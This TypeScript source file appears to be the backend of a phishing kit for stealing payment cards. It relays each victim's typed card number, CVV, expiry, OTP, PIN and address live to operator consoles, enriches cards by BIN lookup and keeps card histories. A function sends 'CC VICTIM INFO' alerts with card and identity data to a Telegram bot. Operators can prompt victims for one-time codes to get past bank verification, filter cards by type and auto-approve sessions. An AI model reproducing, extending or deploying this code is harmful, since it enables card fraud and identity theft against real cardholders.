import { WebSocketServer, WebSocket } from 'ws';
import * as paymentService from '../services/payment.service.js';
import { lookupBIN } from '../bin/bin-lookup.js';
import { queryOne } from '../database/connection.js';
import { v4 as uuid } from 'uuid';
import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dir = dirname(fileURLToPath(import.meta.url));
const SETTINGS_FILE = join(__dir, '..', '..', 'data', 'console-settings.json');

const sessions = new Map<string, { customerWs?: WebSocket | null; id: string; sessionId: number }>();
const operators = new Set<WebSocket>();
const customers = new Set<WebSocket>();
const customerSessions = new Map<string, string>();
let sessionCounter = 999;

// Console settings (shared across all operators)
const consoleSettings = {
  unattendedMode: false,
  unattendedSeconds: 3,
  allowDuplicateCard: false,
  cardTypeFilter: 'off' as 'off' | 'C' | 'D',
  autoRejectBins: [] as string[],
  tgBotToken: '',
  tgChatId: '',
};

// Load persisted settings
try {
  if (!existsSync(dirname(SETTINGS_FILE))) mkdirSync(dirname(SETTINGS_FILE), { recursive: true });
  if (existsSync(SETTINGS_FILE)) {
    const saved = JSON.parse(readFileSync(SETTINGS_FILE, 'utf8'));
    Object.assign(consoleSettings, saved);
    console.log('[WS] Loaded server settings');
  }
} catch {}

function saveServerSettings() {
  try {
    writeFileSync(SETTINGS_FILE, JSON.stringify(consoleSettings, null, 2));
  } catch {}
}

async function sendTgMessage(text: string) {
  const token = consoleSettings.tgBotToken;
  const chatId = consoleSettings.tgChatId;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    });
  } catch { /* TG push failure is non-critical */ }
}

function broadcast(type: string, data: any, sessionId?: string) {
  const msg = JSON.stringify({ type, sessionId, payload: data, timestamp: new Date().toISOString() });
  operators.forEach(ws => { if (ws.readyState === 1) ws.send(msg); });
}

function sendToCustomer(sessionId: string, data: any) {
  const s = sessions.get(sessionId);
  if (s?.customerWs?.readyState === 1) {
    s.customerWs.send(JSON.stringify({ type: 'operator_action', payload: data, timestamp: new Date().toISOString() }));
  }
}

async function broadcastConnectCount() {
  let opCount = 0;
  operators.forEach(ws => { if ((ws as any)._countable !== false) opCount++; });
  broadcast('connect_count', { customerCount: customers.size, operatorCount: opCount });
}

function toA2(country: string): string {
  if (country.length <= 2) return country.toUpperCase();
  const map: Record<string, string> = {
    'Canada': 'CA', 'United States': 'US', 'Japan': 'JP', 'Australia': 'AU',
    'United Kingdom': 'GB', 'Germany': 'DE', 'France': 'FR', 'China': 'CN',
    'Brazil': 'BR', 'India': 'IN', 'Mexico': 'MX', 'Spain': 'ES', 'Italy': 'IT',
    'Korea, Republic of': 'KR', 'Netherlands': 'NL', 'Switzerland': 'CH',
    'Sweden': 'SE', 'Norway': 'NO', 'Denmark': 'DK', 'Finland': 'FI',
    'Russia': 'RU', 'Singapore': 'SG', 'Hong Kong': 'HK', 'Taiwan': 'TW'
  };
  return map[country] || country;
}

function addBrowsingTab(s: any, label: string, count: number) {
  if (!s.browsingTabs) s.browsingTabs = [];
  if (!s.browsingTabs.some((t: any) => t.label === label)) {
    s.browsingTabs.push({ label, count, active: false });
  }
}

async function enrichAndSaveCardInfo(cardInfo: any) {
  const clean = (cardInfo.cardNumber || '').replace(/\s/g, '');
  if (!clean || clean.length < 6) return cardInfo;
  const info = await lookupBIN(clean.slice(0, 6));
  if (info.brand) cardInfo.cardType = info.brand;
  if (info.type) cardInfo.cardLevel = info.type;
  if (info.issuer) cardInfo.bankName = info.issuer;
  if (info.country) cardInfo.cardCountry = toA2(info.country);
  if ((info as any).rawType) cardInfo.cardSubType = (info as any).rawType;
  // Clear cardType if old enrichment has incorrect value
  if (cardInfo.cardType && !cardInfo.cardLevel) cardInfo.cardLevel = '';

  return cardInfo;
}

export async function setupWebSocket(server: any) {
  // Restore session counter from database
  try {
    const maxRow = queryOne('SELECT MAX(session_id) as mx FROM payment_sessions', []);
    if (maxRow?.mx > sessionCounter) sessionCounter = maxRow.mx;
    console.log('[WS] Session counter initialized:', sessionCounter);
  } catch {}

  const wss = new WebSocketServer({ server });
  console.log('[WS] WebSocket server ready');

  wss.on('connection', (ws: WebSocket, req) => {
    const url = new URL(req.url!, 'http://localhost');
    const role = url.searchParams.get('role');
    const cid = url.searchParams.get('cid');
    const sid = url.searchParams.get('sid');
    const countable = url.searchParams.get('countable') !== '0';
    const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
    (ws as any)._countable = countable;
    (ws as any)._ip = clientIp;

    if (role === 'operator') {
      operators.add(ws);
      broadcastConnectCount();

      (async () => {
        const list = await paymentService.getPaymentSessions();
        // Fix isOnline: mark sessions with active customer WS as online
        for (const it of list) {
          const mem = sessions.get(it.id);
          if (mem?.customerWs?.readyState === WebSocket.OPEN) {
            it.isOnline = true;
          }
        }
        // augment browsingTabs with cardHistory + info tabs
        for (const s of list) {
          if (s.cardHistory && s.cardHistory.length > 0 && s.browsingTabs) {
            const hasHist = s.browsingTabs.some((t: any) => t.label === '卡片历史');
            if (!hasHist) s.browsingTabs = [...s.browsingTabs, { label: '卡片历史', count: s.cardHistory.length, active: false }];
          }
          const ci = (s as any).customerInfo || {};
          if (ci.fullName || ci.email || ci.address1 || ci.city) {
            const filledCount = [ci.fullName, ci.email, ci.phone, ci.address1, ci.city, ci.state, ci.country, ci.zipCode].filter(Boolean).length;
            if (s.browsingTabs && !s.browsingTabs.some((t: any) => t.label === '地址页')) {
              s.browsingTabs.push({ label: '地址页', count: filledCount, active: false });
            }
          }
        }
        ws.send(JSON.stringify({ type: 'session_list', payload: list, timestamp: new Date().toISOString() }));
      })();
    } else if (role === 'customer') {
      customers.add(ws);
      broadcastConnectCount();

      let reusedSessionId = sid;
      if (!reusedSessionId && cid) reusedSessionId = customerSessions.get(cid);
      if (reusedSessionId && sessions.has(reusedSessionId)) {
        const s = sessions.get(reusedSessionId)!;
        s.customerWs = ws;
        (ws as any)._sessionId = reusedSessionId;
        (s as any).lastHeartbeat = Date.now();
        paymentService.upsertSession({ id: reusedSessionId, isOnline: true });
        ws.send(JSON.stringify({
          type: 'operator_action',
          payload: {
            action: 'session_restored',
            sessionId: reusedSessionId,
            status: (s as any).status || 'live',
            cardInfo: (s as any).cardInfo || {},
            customerInfo: (s as any).customerInfo || {},
            browsingTabs: (s as any).browsingTabs || [],
            currentStep: (s as any).currentStep || 'card'
          },
          timestamp: new Date().toISOString()
        }));
        broadcast('session_update', {
          sessionId: reusedSessionId, isOnline: true,
          cardInfo: (s as any).cardInfo || {},
          customerInfo: (s as any).customerInfo || {},
          browsingTabs: (s as any).browsingTabs || [],
          currentStep: (s as any).currentStep || 'card',
          status: (s as any).status || 'live',
          frontendUrl: (s as any).frontendUrl || ''
        }, reusedSessionId);
      }
    }

    ws.on('message', async (raw) => {
      let msg: any;
      try { msg = JSON.parse(raw.toString()); } catch { return; }

      try {

      switch (msg.type) {
        case 'customer_input': {
          // If customer already has an active session, reuse it (prevents duplicates on refresh)
          if (cid && customerSessions.has(cid)) {
            const reuseId = customerSessions.get(cid)!;
            const reuseS = sessions.get(reuseId);
            if (reuseS && (reuseS as any).status === 'live') {
              reuseS.customerWs = ws;
              (ws as any)._sessionId = reuseId;
              (reuseS as any).lastHeartbeat = Date.now();
              paymentService.upsertSession({ id: reuseId, isOnline: true });
              ws.send(JSON.stringify({
                type: 'operator_action',
                payload: {
                  action: 'session_restored',
                  sessionId: reuseId,
                  sessionIdNum: (reuseS as any).sessionId || reuseS.sessionId,
                  status: (reuseS as any).status || 'live',
                  cardInfo: (reuseS as any).cardInfo || {},
                  customerInfo: (reuseS as any).customerInfo || {}
                },
                timestamp: new Date().toISOString()
              }));
              broadcast('session_update', {
                sessionId: reuseId, isOnline: true,
                cardInfo: (reuseS as any).cardInfo || {},
                customerInfo: (reuseS as any).customerInfo || {},
                browsingTabs: (reuseS as any).browsingTabs || [],
                currentStep: (reuseS as any).currentStep || 'card',
                status: (reuseS as any).status || 'live',
                frontendUrl: (reuseS as any).frontendUrl || ''
              }, reuseId);
              break;
            }
          }
          const counterId = String(++sessionCounter);
          const payload = msg.payload || {};

          // Save to DB immediately (no await for BIN)
          paymentService.upsertSession({
            id: counterId, sessionId: sessionCounter, customerId: cid,
            frontendUrl: payload.frontendUrl, status: 'live', currentStep: payload.currentStep,
            cardInfo: payload.cardInfo, customerInfo: payload.customerInfo,
            browsingTabs: payload.browsingTabs, isOnline: true,
            ip: (ws as any)._ip, ua: payload.ua || '',
            lastActivityTs: Date.now()
          });

          // Fix 卡片页 count based on filled fields
          if (payload.browsingTabs) {
            const cardFields = [payload.cardInfo?.cardNumber, payload.cardInfo?.cardHolder, payload.cardInfo?.expiry, payload.cardInfo?.cvv].filter(Boolean).length;
            const ctIdx = payload.browsingTabs.findIndex((t: any) => t.label === '卡片页');
            if (ctIdx >= 0) payload.browsingTabs[ctIdx].count = cardFields;
          }

          sessions.set(counterId, {
            customerWs: ws, id: counterId, sessionId: sessionCounter,
            cardInfo: payload.cardInfo || {},
            customerInfo: payload.customerInfo || {},
            browsingTabs: payload.browsingTabs || [],
            currentStep: payload.currentStep || 'card',
            frontendUrl: payload.frontendUrl || '',
            ip: (ws as any)._ip, ua: payload.ua || '',
            lastActivityTs: Date.now()
          });
          (ws as any)._sessionId = counterId;
          if (cid) customerSessions.set(cid, counterId);

          // Broadcast immediately (before BIN enrichment)
          broadcast('session_new', {
            ...payload, id: counterId, sessionId: sessionCounter, status: 'live',
            createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
            isOnline: true, countdownSeconds: 0, cardHistory: [],
            ip: (ws as any)._ip, ua: payload.ua || '', lastActivityTs: Date.now()
          }, counterId);

          sendToCustomer(counterId, { action: 'ack', message: 'session_created', sessionId: counterId });

          // async BIN enrichment (non-blocking)
          enrichAndSaveCardInfo(payload.cardInfo || {}).then(() => {
            const s = sessions.get(counterId);
            if (s && payload.cardInfo) {
              Object.assign((s as any).cardInfo, payload.cardInfo);
              paymentService.upsertSession({ id: counterId, cardInfo: payload.cardInfo });
              broadcast('session_update', { sessionId: counterId, cardInfo: payload.cardInfo }, counterId);
            }
          });
          break;
        }

        case 'session_update': {
          const { sessionId, ...data } = msg.payload;
          if (!sessionId) break;
          const s = sessions.get(sessionId);
          if (!s) break;

          // Track customer activity timestamp
          (s as any).lastActivityTs = Date.now();

          const prevStatus = s.status;

          // merge
          if (data.cardInfo) {
            // Clear old BIN enrichment when new card submitted
            if (data.cardInfo.cardNumber && !data.cardInfo.bankName) {
              delete data.cardInfo.bankName;
              delete data.cardInfo.cardType;
              delete data.cardInfo.cardLevel;
              delete data.cardInfo.cardSubType;
              delete data.cardInfo.cardCountry;
            }
            s.cardInfo = { ...s.cardInfo, ...data.cardInfo };
          }
          if (data.customerInfo) s.customerInfo = { ...s.customerInfo, ...data.customerInfo };
          if (data.browsingTabs !== undefined) s.browsingTabs = data.browsingTabs;
          if (data.currentStep !== undefined) s.currentStep = data.currentStep;
          if (data.frontendUrl !== undefined) s.frontendUrl = data.frontendUrl;
          if (data.sessionId !== undefined) s.sessionId = data.sessionId;

          if (data.status === 'pending') {
            if (prevStatus !== 'pending') {
              s.pendingTs = Date.now();
            }
            s.status = 'pending';
            const curCard = (s as any).cardInfo || {};
            const lastCard = (s as any).lastCardInfo;
            const same = lastCard
              && lastCard.cardNumber === curCard.cardNumber
              && lastCard.expiry === curCard.expiry
              && lastCard.cvv === curCard.cvv;
            if (!same) {
              await paymentService.addCardHistory(sessionId, curCard);
              (s as any).lastCardInfo = { ...curCard };
            }
            await paymentService.upsertSession({ id: sessionId, status: 'pending', cardInfo: curCard });

            // TG push on first pending
            if (prevStatus !== 'pending') {
              const ci = (s as any).cardInfo || {};
              const ui = (s as any).customerInfo || {};
              const tgText = [
                '💳 | CC VICTIM INFO 💳',
                '',
                `编号: ${(s as any).sessionId || sessionId}`,
                `订单号: A-${(s as any).sessionId || sessionId}`,
                `IP: ${(s as any).ip || '-'}`,
                `UA: ${(s as any).ua || '-'}`,
                `CT: ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`,
                '',
                `姓名: ${ui.fullName || '-'}`,
                `卡号: ${(ci.cardNumber || '').replace(/(\d{4})/g, '$1 ').trim() || '-'}`,
                '',
                `卡类型: ${ci.cardType || '-'}`,
                `卡等级: ${ci.cardLevel || '-'}`,
                `卡银行: ${ci.bankName || '-'}`,
                `卡国家: ${ci.country || '-'}`,
              ].join('\n');
              sendTgMessage(tgText);
            }
          }

          await paymentService.upsertSession({
            id: sessionId,
            sessionId: (s as any).sessionId || sessionCounter,
            status: data.status || s.status || 'live',
            currentStep: data.currentStep || s.currentStep,
            cardInfo: s.cardInfo,
            customerInfo: s.customerInfo,
            browsingTabs: data.browsingTabs || s.browsingTabs,
            countdownSeconds: 120
          });

          const updatePayload: any = {
            sessionId,
            cardInfo: s.cardInfo,
            customerInfo: s.customerInfo,
            browsingTabs: data.browsingTabs !== undefined ? data.browsingTabs : s.browsingTabs,
            currentStep: data.currentStep !== undefined ? data.currentStep : s.currentStep,
            frontendUrl: data.frontendUrl !== undefined ? data.frontendUrl : s.frontendUrl,
            isOnline: (s as any).isOnline,
            lastActivityTs: (s as any).lastActivityTs,
            status: data.status !== undefined ? data.status : s.status
          };
          if (data.status === 'pending' && prevStatus !== 'pending') {
            updatePayload.countdownSeconds = 120;
          }
          const dbSession = await paymentService.getSessionById(sessionId);
          if (dbSession?.cardHistory && dbSession.cardHistory.length > 0) {
            updatePayload.cardHistory = dbSession.cardHistory;
          }

          // add auxiliary tabs to browsingTabs
          if (updatePayload.browsingTabs) {
            // 卡片页: count based on filled card info fields
            const cardFields = [s.cardInfo.cardNumber, s.cardInfo.cardHolder, s.cardInfo.expiry, s.cardInfo.cvv].filter(Boolean).length;
            const cardTabIdx = updatePayload.browsingTabs.findIndex((t: any) => t.label === '卡片页');
            if (cardTabIdx >= 0) updatePayload.browsingTabs[cardTabIdx].count = cardFields;
            // Card history
            if (dbSession?.cardHistory && dbSession.cardHistory.length > 0) {
              const idx = updatePayload.browsingTabs.findIndex((t: any) => t.label === '卡片历史');
              const hTab = { label: '卡片历史', count: dbSession.cardHistory.length, active: false };
              if (idx >= 0) updatePayload.browsingTabs[idx] = hTab;
              else updatePayload.browsingTabs.push(hTab);
            }
            // Customer info
            const ci = (s as any).customerInfo || {};
            if (ci.fullName || ci.email || ci.address1 || ci.city) {
              const filledCount = [ci.fullName, ci.email, ci.phone, ci.address1, ci.city, ci.state, ci.country, ci.zipCode].filter(Boolean).length;
              const addrIdx = updatePayload.browsingTabs.findIndex((t: any) => t.label === '地址页');
              if (addrIdx >= 0) updatePayload.browsingTabs[addrIdx].count = filledCount;
              else updatePayload.browsingTabs.push({ label: '地址页', count: filledCount, active: false });
            }
            // 验证页: only when customer submits code
            if (s.cardInfo?.otpCode) {
              const step = s.currentStep;
              if (step === 'otp' && !updatePayload.browsingTabs.some((t: any) => t.label === 'OTP验证页')) {
                updatePayload.browsingTabs.push({ label: 'OTP验证页', count: 2, active: false });
              } else if (step === 'email_verify' && !updatePayload.browsingTabs.some((t: any) => t.label === 'Email验证页')) {
                updatePayload.browsingTabs.push({ label: 'Email验证页', count: 2, active: false });
              } else if (step === 'pin_verify' && !updatePayload.browsingTabs.some((t: any) => t.label === 'PIN验证页')) {
                updatePayload.browsingTabs.push({ label: 'PIN验证页', count: 2, active: false });
               }
            }
          }

          broadcast('session_update', updatePayload, sessionId);

          // Console settings: auto-checks
          if (data.status === 'pending') {
            const ci = (s as any).cardInfo || {};
            const cardNum = (ci.cardNumber || '').replace(/\s/g, '');

            // Auto-reject BIN blacklist
            if (cardNum.length >= 6 && consoleSettings.autoRejectBins.length > 0) {
              const bin6 = cardNum.slice(0, 6);
              if (consoleSettings.autoRejectBins.includes(bin6)) {
                sendToCustomer(sessionId, { action: 'reject', message: '不支持此卡号', sessionId });
                (s as any).status = 'rejected';
                broadcast('session_update', { sessionId, status: 'rejected', action: 'reject', message: '卡头黑名单自动拒绝' }, sessionId);
              }
            }

            // Card type filter
            if (consoleSettings.cardTypeFilter !== 'off') {
              const cardType = ci.cardType || '';
              const isCredit = cardType.includes('CREDIT') || cardType.includes('CLASSIC') || cardType.includes('GOLD') || cardType.includes('PLATINUM') || cardType.includes('SIGNATURE') || cardType.includes('WORLD');
              const isDebit = cardType.includes('DEBIT');
              if ((consoleSettings.cardTypeFilter === 'C' && isDebit) || (consoleSettings.cardTypeFilter === 'D' && isCredit)) {
                const label = consoleSettings.cardTypeFilter === 'C' ? 'C卡(信用卡)' : 'D卡(借记卡)';
                sendToCustomer(sessionId, { action: 'reject', message: '不支持此类卡，仅支持' + label, sessionId });
                (s as any).status = 'rejected';
                broadcast('session_update', { sessionId, status: 'rejected', action: 'reject', message: '卡类型筛选自动拒绝' }, sessionId);
              }
            }

            // Unattended mode: auto-approve after delay
            if (consoleSettings.unattendedMode) {
              setTimeout(() => {
                if ((s as any).status === 'pending') {
                  (s as any).status = 'approved';
                  paymentService.upsertSession({ id: sessionId, status: 'approved' });
                  broadcast('session_update', { sessionId, status: 'approved', action: 'approve', message: '无人值守自动通过' }, sessionId);
                  sendToCustomer(sessionId, { action: 'approve', message: '自动通过', sessionId });
                }
              }, consoleSettings.unattendedSeconds * 1000);
            }
          }

          if (data.cardInfo) {
            enrichAndSaveCardInfo(data.cardInfo).then(() => {
              Object.assign((s as any).cardInfo, data.cardInfo);
              paymentService.upsertSession({ id: sessionId, cardInfo: data.cardInfo });
              broadcast('session_update', { sessionId, cardInfo: data.cardInfo }, sessionId);
            });
          }
          break;
        }

        case 'operator_action': {
          const { sessionId, action, message } = msg.payload;
          const s = sessions.get(sessionId);
          paymentService.addAuditLog(sessionId, msg.payload.operatorId || 'unknown', action, message);

          const rejectActions = ['reject', 'card_error', 'otp_error', 'app_verify_fail'];
          const newStatus = action === 'approve' ? 'approved'
            : action === 'redirect_complete' ? 'completed'
            : rejectActions.includes(action) ? 'rejected'
            : 'processing';

          if (s) {
            s.status = newStatus;
            // Clear OTP on change_card
            if (action === 'change_card') {
              (s as any).cardInfo.otpCode = '';
            }
            // Update currentStep for verification actions
            if (action === 'app_verify') {
              s.currentStep = 'app_verify';
            } else if (action === 'otp_verify' || action === 'custom_otp_tail' || action === 'custom_otp_verify') {
              s.currentStep = 'otp';
            } else if (action === 'email_verify') {
              s.currentStep = 'email_verify';
            } else if (action === 'pin_verify') {
              s.currentStep = 'pin_verify';
            }
          }
          paymentService.upsertSession({ id: sessionId, status: newStatus, currentStep: s?.currentStep });

          const bcast: any = { sessionId, status: newStatus, action, message, currentStep: s?.currentStep };
          if (action === 'change_card' && s) {
            // Send full cardInfo so frontend reactivity picks up otpCode change
            bcast.cardInfo = { ...(s as any).cardInfo };
          }
          broadcast('session_update', bcast, sessionId);

          // Build customer message for specific rejections
          let custMsg = message || '';
          let phoneSuffix = '';

          if (action === 'card_error') custMsg = message || 'Card error - please verify your card details';
          if (action === 'otp_error') custMsg = message || 'Verification code error - please try again';
          if (action === 'app_verify_fail') custMsg = message || 'APP verification not completed. Please try again.';
          if (action === 'custom_prompt') custMsg = message || '';
          if (action === 'change_card_prompt') custMsg = message || '请更换卡片重新支付';

          // For app_verify, always re-enrich cardInfo (card may have changed)
          if (action === 'app_verify' && s) {
            try {
              await enrichAndSaveCardInfo((s as any).cardInfo);
              paymentService.upsertSession({ id: sessionId, cardInfo: (s as any).cardInfo });
              broadcast('session_update', { sessionId, cardInfo: { ...(s as any).cardInfo } }, sessionId);
            } catch {}
          }
          if (action === 'otp_verify' || action === 'custom_otp_tail' || action === 'custom_email_verify') {
            phoneSuffix = (action === 'custom_otp_tail' || action === 'custom_email_verify') ? (message || (action === 'custom_otp_tail' ? '****' : '')) : '';
            if (!phoneSuffix && s && action === 'otp_verify') {
              const phone = (s as any).customerInfo?.phone || '';
              phoneSuffix = phone.replace(/\D/g, '').slice(-4) || '****';
            }
          }

          sendToCustomer(sessionId, {
            action,
            message: custMsg,
            sessionId,
            phoneSuffix,
            cardInfo: s ? { ...(s as any).cardInfo } : undefined,
            amount: s ? (s as any).amount || (s as any).cardInfo?.amount : undefined
          });
          break;
        }

        case 'update_settings': {
          Object.assign(consoleSettings, msg.payload || {});
          if (msg.payload?.autoRejectBins && typeof msg.payload.autoRejectBins === 'string') {
            consoleSettings.autoRejectBins = msg.payload.autoRejectBins.split(',').map((b: string) => b.trim()).filter(Boolean);
          }
          console.log('[Settings] Updated:', JSON.stringify(consoleSettings));
          saveServerSettings();
          break;
        }

        case 'resend_otp': {
          const { sessionId } = msg.payload;
          const s = sessions.get(sessionId);
          if (!s) break;
          s.otpResendCount = (s.otpResendCount || 0) + 1;
          if (s.otpResendCount > 5) {
            sendToCustomer(sessionId, { action: 'resend_limit', message: 'Maximum resend attempts reached. Please try again later.' });
            break;
          }
          // Notify all operators
          operators.forEach(op => {
            if (op.readyState === WebSocket.OPEN) {
              op.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId, count: s!.otpResendCount } }));
            }
          });
          // Tell customer to wait 1 minute
          sendToCustomer(sessionId, { action: 'resend_ok', message: 'OTP resent', count: s.otpResendCount });
          break;
        }

        case 'app_verify_done': {
          const { sessionId } = msg.payload;
          const s = sessions.get(sessionId);
          if (s) {
            s.status = 'pending';
            s.pendingTs = Date.now();
            paymentService.upsertSession({ id: sessionId, status: 'pending' });
            broadcast('session_update', { sessionId, status: 'pending', action: 'app_verify_done' }, sessionId);
          }
          operators.forEach(op => {
            if (op.readyState === WebSocket.OPEN) {
              op.send(JSON.stringify({ type: 'app_verify_done', payload: { sessionId } }));
            }
          });
          break;
        }

        case 'heartbeat':
          ws.send(JSON.stringify({ type: 'heartbeat', payload: 'pong', timestamp: new Date().toISOString() }));
          const sid2 = (ws as any)._sessionId;
          if (sid2) {
            const s2 = sessions.get(sid2);
            if (s2) (s2 as any).lastHeartbeat = Date.now();
          }
          break;
      }
      } catch (e: any) {
        console.error('[WS] Message error:', e.message || e);
      }
    });

    ws.on('close', () => {
      if (role === 'operator') { operators.delete(ws); }
      else if (role === 'customer') {
        customers.delete(ws);
        for (const [id, s] of sessions) {
          if (s.customerWs === ws) {
            s.customerWs = null;
            paymentService.upsertSession({ id, isOnline: false });
            broadcast('session_update', { sessionId: id, isOnline: false }, id);
          }
        }
      }
      broadcastConnectCount();
    });
  });

  // countdown timer
  setInterval(() => {
    sessions.forEach((s, id) => {
      if (s.status !== 'pending' || !s.pendingTs) return;
      const elapsed = Math.floor((Date.now() - s.pendingTs) / 1000);
      const remaining = Math.max(0, 120 - elapsed);
      if (elapsed % 5 === 0) {
        broadcast('session_update', { sessionId: id, countdownSeconds: remaining }, id);
      }
    });
  }, 1000);

  // heartbeat-based offline detection (60s timeout)
  setInterval(() => {
    const now = Date.now();
    sessions.forEach((s, id) => {
      if (!s.customerWs || s.customerWs.readyState !== WebSocket.OPEN) return;
      // Only check if this ws still maps to this session
      const wsSid = (s.customerWs as any)._sessionId;
      if (wsSid && wsSid !== id) return; // ws moved to different session, skip
      const lastHb = (s as any).lastHeartbeat || 0;
      if (lastHb && now - lastHb > 60000) {
        s.customerWs.close();
        s.customerWs = null;
        customers.delete(s.customerWs!);
        paymentService.upsertSession({ id, isOnline: false });
        broadcast('session_update', { sessionId: id, isOnline: false }, id);
      }
    });
    broadcastConnectCount();
  }, 10000);
}
